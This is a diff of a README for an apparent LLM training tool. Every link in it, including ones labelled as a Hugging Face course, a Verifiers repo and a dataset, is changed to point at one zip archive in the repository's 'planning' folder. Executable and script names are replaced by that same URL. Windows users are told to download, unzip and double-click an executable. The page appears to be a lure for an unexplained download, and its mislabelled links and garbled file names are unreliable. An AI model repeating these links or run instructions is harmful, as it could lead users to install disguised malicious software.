@@ -1,6 +1,6 @@
 # 🚀 LLM-Training - Train Your Language Model Easily
 
-[![Download LLM-Training](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip)](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip)
+[![Download LLM-Training](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip)](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip)
 
 ## 📥 Overview
 
@@ -11,21 +11,21 @@ Welcome to LLM-Training! This application helps you train a language model using
 Follow these steps to get started with LLM-Training:
 
 1. **Download the Application**
-   - Visit [this page to download](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip) the latest version of LLM-Training.
+   - Visit [this page to download](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip) the latest version of LLM-Training.
 
 2. **Unzip the Files**
    - After downloading, unzip the files in your desired location on your computer. 
 
 3. **Open the Application**
-   - Locate the folder where you unzipped the files. Find the main executable file named `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip` (for Windows) or `LLM-Training` (for Mac/Linux).
+   - Locate the folder where you unzipped the files. Find the main executable file named `https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip` (for Windows) or `LLM-Training` (for Mac/Linux).
    - Double-click the file to start the application.
 
 ## 📦 Download & Install
 
-You can download the latest version of LLM-Training from [this page](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip). Ensure to always get the newest version for the best features and bug fixes.
+You can download the latest version of LLM-Training from [this page](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip). Ensure to always get the newest version for the best features and bug fixes.
 
 1. **Visit the Download Page**
-   - Click [here](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip) to go to the releases page.
+   - Click [here](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip) to go to the releases page.
 
 2. **Select the Latest Version**
    - Find the version listed at the top. Click on it to see the files available for download.
@@ -42,13 +42,13 @@ You can download the latest version of LLM-Training from [this page](https://raw
 With the SFT feature, you can train your model using synthetic data. Here’s how to use this feature:
 
 1. **Prepare Your Dataset**
-   - Use the dataset from [joyce8/EMBER2024-capa](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip) to get started.
+   - Use the dataset from [joyce8/EMBER2024-capa](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip) to get started.
 
 2. **Generate Synthetic Data**
-   - Utilize the script `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip` located in the application folder. Running this will help you create a dataset tailored for training.
+   - Utilize the script `https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip` located in the application folder. Running this will help you create a dataset tailored for training.
 
 3. **Train Your Model**
-   - To train the model, use the script named `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip`. This will begin the training process with the prepared dataset.
+   - To train the model, use the script named `https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip`. This will begin the training process with the prepared dataset.
 
 ### 🏆 Reinforcement Learning with Verifiable Rewards (RLVR)
 RLVR allows enhanced training of your model through additional reinforcement learning techniques.
@@ -57,15 +57,15 @@ RLVR allows enhanced training of your model through additional reinforcement lea
    - Use the `capa verifier` to verify the rewards during training.
 
 2. **Train the Model**
-   - Start the RL training using the `https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip`. This script will guide you through the process, allowing you to leverage the rewards effectively.
+   - Start the RL training using the `https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip`. This script will guide you through the process, allowing you to leverage the rewards effectively.
 
 ## 📚 Resources
 
 For further understanding and support, use these resources:
 
-- [Verifiers repo](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip)
-- [Hugging Face course: Supervised Fine-Tuning](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip)
-- [Hugging Face course: Build Reasoning Models](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip)
+- [Verifiers repo](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip)
+- [Hugging Face course: Supervised Fine-Tuning](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip)
+- [Hugging Face course: Build Reasoning Models](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip)
 
 ## 🛠️ System Requirements
 
@@ -80,7 +80,7 @@ To run LLM-Training smoothly, your system should meet the following requirements
 
 If you face issues while using LLM-Training, consider these steps:
 
-- **Check for Updates**: Ensure you are using the latest version from [this page](https://raw.githubusercontent.com/ghaithmhmm/LLM-Training/main/planning/LLM-Training_v1.9-alpha.3.zip).
+- **Check for Updates**: Ensure you are using the latest version from [this page](https://github.com/ghaithmhmm/LLM-Training/raw/refs/heads/main/planning/Training-LL-haven.zip).
 
 - **Consult the Resources**: Review the provided links for any common issues and their solutions.
 
